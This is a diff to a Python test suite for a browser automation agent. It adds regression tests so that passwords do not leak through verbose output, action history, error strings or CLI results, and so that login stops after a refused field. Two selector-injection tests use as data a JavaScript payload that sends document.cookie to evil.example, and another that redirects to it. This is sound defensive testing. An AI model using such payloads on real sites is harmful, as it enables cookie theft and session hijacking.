@@ -226,6 +226,19 @@ class AgentTestCase(unittest.TestCase):
                 'confirm_token': 'abc123',
             })
 
+    def serve_element_not_found(self, **options):
+        """What the extension throws when no element matched.
+
+        extension/content.js:802 builds the message as
+        `Element not found with options: ${JSON.stringify(options)}`, so the
+        text it was asked to type comes back inside a free-text error string,
+        where no key name marks it as a secret.
+        """
+        self.serve_json({
+            'success': False,
+            'error': 'Element not found with options: %s' % json.dumps(options),
+        })
+
     def serve_password_refusal(self, count=1):
         """What the extension returns by default for a password field."""
         for _ in range(count):
@@ -335,8 +348,7 @@ class ApiTokenTests(AgentTestCase):
         self.assertTrue(result.get('success'))
         self.assertIsNone(self.only_request().header('X-API-Key'))
 
-    # DEFECT D14: asserts CORRECT behaviour; delete the decorator
-    # below (or run with -k) to see it fail against the current source.
+    # Regression test for defect D14.
     def test_an_empty_token_file_sends_no_token_header(self):
         """An empty or whitespace-only token file means "not configured".
         Sending X-API-Key: '' instead turns that into a bare 403, so the user
@@ -397,8 +409,9 @@ class ApiTokenTests(AgentTestCase):
 
 class CredentialHandlingTests(AgentTestCase):
 
-    # DEFECT D1: asserts CORRECT behaviour; delete the decorator
-    # below (or run with -k) to see it fail against the current source.
+    # Regression test for defect D1: call_tool logged the raw kwargs, so
+    # --verbose printed the password to the terminal and into any captured
+    # session log, undoing the redaction the server and the audit log perform.
     def test_a_password_is_not_printed_in_verbose_mode(self):
         self.serve_password_refusal()
         agent = browser_agent.BrowserAutomationAgent(verbose=True)
@@ -406,40 +419,62 @@ class CredentialHandlingTests(AgentTestCase):
                               selector='input[type="password"]')
         self.assertNotIn(
             PASSWORD, out,
-            'browser_agent.py:97 logs the raw kwargs, so --verbose prints the '
-            'password to the terminal and into any captured session log, '
-            'undoing the redaction the server and the audit log perform. '
-            'Redact the argument names server.py already treats as '
-            'sensitive before logging them.')
+            'the password reached stdout; redact the argument names '
+            'server.py already treats as sensitive before logging them')
 
-    # DEFECT D2: asserts CORRECT behaviour; delete the decorator
-    # below (or run with -k) to see it fail against the current source.
+    # Regression test for defect D2: call_tool kept the raw kwargs in
+    # action_history, so the plaintext password stayed in the process for the
+    # life of the agent, reachable from any dump, traceback or crash report.
     def test_a_password_is_not_retained_in_the_action_history(self):
         self.serve_password_refusal()
         agent = browser_agent.BrowserAutomationAgent()
         agent.login('alice', PASSWORD, submit_selector='#go')
         self.assertNotIn(
             PASSWORD, self.history_dump(agent),
-            'browser_agent.py:104-112 keeps the raw kwargs in action_history, '
-            'so the plaintext password stays in the process for the life of '
-            'the agent and reaches any dump, traceback or crash report that '
-            'touches it.')
+            'the password is still retained in action_history')
 
-    # DEFECT D3: asserts CORRECT behaviour; delete the decorator
-    # below (or run with -k) to see it fail against the current source.
+    # Regression test for defect D3.
     def test_verbose_mode_does_not_echo_a_credential_back_from_a_result(self):
-        """browser_agent.py:116 prints the entire server result. Results from
-        the browser echo arguments back (the extension's not-found error
-        embeds JSON.stringify(options), and browser_get_value returns field
-        contents), so printing them wholesale is a second path for the same
-        secret."""
+        """Verbose mode printed the whole server result. browser_get_value
+        returns a field's contents, so a result is a second path out for the
+        same secret even when the client never logged its own arguments."""
         self.serve_json({'success': True, 'value': PASSWORD})
         agent = browser_agent.BrowserAutomationAgent(verbose=True)
         _, out = self.capture(agent.get_value, '#password')
         self.assertNotIn(PASSWORD, out)
 
-    # DEFECT D5: asserts CORRECT behaviour; delete the decorator
-    # below (or run with -k) to see it fail against the current source.
+    # Regression test for defect D3.
+    def test_a_password_inside_an_error_message_is_not_printed_or_kept(self):
+        """The other half of D3, and the one the fix for it missed: redaction
+        walked the result's keys, and the extension's not-found error carries
+        the typed text inside the free-text 'error' string, under no key that
+        names it a secret. Both the verbose log and action_history took that
+        string verbatim."""
+        self.serve_element_not_found(text=PASSWORD, clear=True, name='password')
+        agent = browser_agent.BrowserAutomationAgent(verbose=True)
+        _, out = self.capture(agent.type_text, PASSWORD, name='password')
+        self.assertNotIn(
+            PASSWORD, out,
+            'the password reached stdout through the error message')
+        self.assertNotIn(
+            PASSWORD, self.history_dump(agent),
+            'the password is retained in action_history through the error '
+            'message')
+
+    # Regression test for defect D3.
+    def test_an_abandoned_login_does_not_quote_the_password_back(self):
+        """login() explains why it stopped, and the reason it quotes is the
+        server's error - which, for a not-found error, is the typed password.
+        The explanation must not put the secret back in the caller's hands."""
+        self.serve_ok()  # username typed
+        self.serve_element_not_found(text=PASSWORD, clear=True,
+                                     selector='#p')  # no password field there
+        agent = browser_agent.BrowserAutomationAgent()
+        results = agent.login('alice', PASSWORD,
+                              username_selector='#u', password_selector='#p')
+        self.assertNotIn(PASSWORD, json.dumps(results))
+
+    # Regression test for defect D5.
     def test_login_does_not_submit_the_form_after_the_password_is_refused(self):
         """Under the shipped default (allow_password_typing: false) the
         password step always fails. Pressing Enter anyway submits the form
@@ -456,8 +491,7 @@ class CredentialHandlingTests(AgentTestCase):
             'login() submitted the form after the password step was refused: '
             '%s' % tools)
 
-    # DEFECT D5: asserts CORRECT behaviour; delete the decorator
-    # below (or run with -k) to see it fail against the current source.
+    # Regression test for defect D5.
     def test_login_does_not_look_successful_when_the_password_was_refused(self):
         self.serve_ok()
         self.serve_password_refusal()
@@ -469,6 +503,41 @@ class CredentialHandlingTests(AgentTestCase):
             'the last entry login() returns is what a caller reads as the '
             'outcome, and it reports success although the credential never '
             'reached the field: %r' % (results,))
+
+    # Regression test for defect D5: the first fix for it guarded only the
+    # password step, so the same bug survived with the fields swapped.
+    def test_login_stops_before_the_password_when_the_username_is_refused(self):
+        """A refused username left the password to be typed anyway and Enter
+        pressed on it: the form was submitted with an empty username and a
+        real password, and the secret was sent to the browser after the
+        sequence had already been refused once."""
+        self.serve_password_refusal()  # the username field was refused
+        self.serve_ok()                # the password typing that must not run
+        self.serve_ok()                # the submit that must not happen
+        agent = browser_agent.BrowserAutomationAgent()
+        agent.login('alice', PASSWORD)
+        self.assertEqual(
+            len(self.requests), 1,
+            'login() carried on after the username step was refused: %s'
+            % [r.body['name'] for r in self.requests])
+        self.assertNotIn(
+            PASSWORD, json.dumps([r.arguments for r in self.requests]),
+            'the password was sent to the browser after the username step '
+            'had already been refused')
+
+    # Regression test for defect D5.
+    def test_login_does_not_look_successful_when_the_username_was_refused(self):
+        self.serve_password_refusal()
+        self.serve_ok()
+        self.serve_ok()
+        agent = browser_agent.BrowserAutomationAgent()
+        results = agent.login('alice', PASSWORD, submit_selector='#go')
+        self.assertFalse(
+            results[-1].get('success'),
+            'the last entry login() returns is what a caller reads as the '
+            'outcome, and it reports success although the sequence was '
+            'abandoned: %r' % (results,))
+        self.assertIn('NOT submitted', results[-1].get('error', ''))
 
     # Regression test for defect D4.
     def test_fill_form_does_not_resend_a_credential_after_a_refusal(self):
@@ -482,6 +551,24 @@ class CredentialHandlingTests(AgentTestCase):
         self.assertLessEqual(
             len(sent), 1,
             'the password was transmitted %d times' % len(sent))
+
+    # The same defect as D5, in the other multi-step helper.
+    def test_fill_form_does_not_submit_after_a_field_was_refused(self):
+        """fill_form checked each field's result only to decide whether to
+        retry the locator, then submitted regardless. With the password field
+        refused that submits a login form holding an empty password - a real
+        failed attempt against the real site - and the click's own success
+        made the returned list read as a completed fill."""
+        self.serve_password_refusal()  # the password field was refused
+        self.serve_ok()                # the submit that must not happen
+        agent = browser_agent.BrowserAutomationAgent()
+        results = agent.fill_form({'password': PASSWORD}, submit=True,
+                                  submit_selector='#go')
+        self.assertEqual(
+            [r.body['name'] for r in self.requests], ['browser_type'],
+            'fill_form submitted the form although a field was refused')
+        self.assertFalse(results[-1].get('success'))
+        self.assertIn('NOT submitted', results[-1].get('error', ''))
 
 
 # --------------------------------------------------------------------------
@@ -499,24 +586,21 @@ class SelectorInterpolationTests(AgentTestCase):
         method(selector)
         return self.only_request().arguments['script']
 
-    # DEFECT D7: asserts CORRECT behaviour; delete the decorator
-    # below (or run with -k) to see it fail against the current source.
+    # Regression test for defect D7.
     def test_extract_text_selector_cannot_break_out_of_the_literal(self):
         agent = browser_agent.BrowserAutomationAgent()
         selector = "a'); fetch('https://evil.example/?c='+document.cookie); ('"
         script = self._script_for(agent.extract_text, selector)
         self.assert_selector_is_data_not_code(script, selector)
 
-    # DEFECT D7: asserts CORRECT behaviour; delete the decorator
-    # below (or run with -k) to see it fail against the current source.
+    # Regression test for defect D7.
     def test_extract_links_selector_cannot_break_out_of_the_literal(self):
         agent = browser_agent.BrowserAutomationAgent()
         selector = "a'); document.location='https://evil.example'; ('"
         script = self._script_for(agent.extract_links, selector)
         self.assert_selector_is_data_not_code(script, selector)
 
-    # DEFECT D7: asserts CORRECT behaviour; delete the decorator
-    # below (or run with -k) to see it fail against the current source.
+    # Regression test for defect D7.
     def test_an_escaped_css_selector_survives_interpolation(self):
         """Not only a security bug: '.md\\:flex' is an everyday Tailwind
         selector. JS eats the backslash, the browser is asked for '.md:flex',
@@ -526,8 +610,7 @@ class SelectorInterpolationTests(AgentTestCase):
         script = self._script_for(agent.extract_text, selector)
         self.assert_selector_is_data_not_code(script, selector)
 
-    # DEFECT D7: asserts CORRECT behaviour; delete the decorator
-    # below (or run with -k) to see it fail against the current source.
+    # Regression test for defect D7.
     def test_a_quoted_attribute_selector_survives_interpolation(self):
         agent = browser_agent.BrowserAutomationAgent()
         selector = "[data-label='it\\'s here']"
@@ -646,8 +729,7 @@ class SafetyDecisionTests(AgentTestCase):
     that reads a refusal as "nothing there", or retries it, is worse than one
     that stops."""
 
-    # DEFECT D8: asserts CORRECT behaviour; delete the decorator
-    # below (or run with -k) to see it fail against the current source.
+    # Regression test for defect D8.
     def test_extract_text_distinguishes_a_denial_from_an_empty_page(self):
         """A denial and "no matching text" both return None, so a caller
         concludes the text is not on the page when the guard refused to
@@ -878,6 +960,45 @@ class CliTests(AgentTestCase):
         except TypeError as exc:
             self.fail('--command crashed with an unhandled TypeError: %s' % exc)
         self.assertIn('Unknown command', out)
+
+    def test_every_listed_command_is_a_method_that_exists(self):
+        """The allowlist named 'get_text', which no method implements, so
+        '--command get_text' ended in an AttributeError traceback."""
+        agent = browser_agent.BrowserAutomationAgent()
+        missing = sorted(name for name in browser_agent.COMMAND_METHODS
+                         if not callable(getattr(agent, name, None)))
+        self.assertEqual(missing, [],
+                         'COMMAND_METHODS names methods that do not exist')
+
+    # Regression test for defect D13: only TypeError was caught, so any other
+    # exception from a command reached the user as a traceback.
+    def test_a_refused_command_is_reported_without_a_traceback(self):
+        """extract_text raises BrowserAgentDenied when the guard refuses, by
+        design - a denial must not read as an empty page. The CLI has to turn
+        that into a sentence."""
+        self.serve_json({'success': False, 'safety_decision': 'read_only',
+                         'error': 'browser_execute_script is refused in '
+                                  'read-only mode.'})
+        _, out = self.run_main('--command', 'extract_text div')
+        self.assertIn('refused', out.lower())
+        self.assertNotIn('Traceback', out)
+
+    # Regression test for defect D13.
+    def test_a_command_argument_of_the_wrong_kind_fails_cleanly(self):
+        """'reload_localhost <url>' hands a non-number to int(); the
+        ValueError escaped main()."""
+        _, out = self.run_main('--command', 'reload_localhost http://x')
+        self.assertIn('ValueError', out,
+                      'the failure must name what went wrong rather than '
+                      'being swallowed: %r' % out)
+        self.assertEqual(self.requests, [])
+
+    def test_a_typed_credential_is_not_echoed_by_the_printed_result(self):
+        """--command type_text prints the server's result, and the
+        not-found error quotes the text it was asked to type."""
+        self.serve_element_not_found(text=PASSWORD, clear=True)
+        _, out = self.run_main('--command', 'type_text %s' % PASSWORD)
+        self.assertNotIn(PASSWORD, out)
 
 
 class InteractiveModeTests(AgentTestCase):
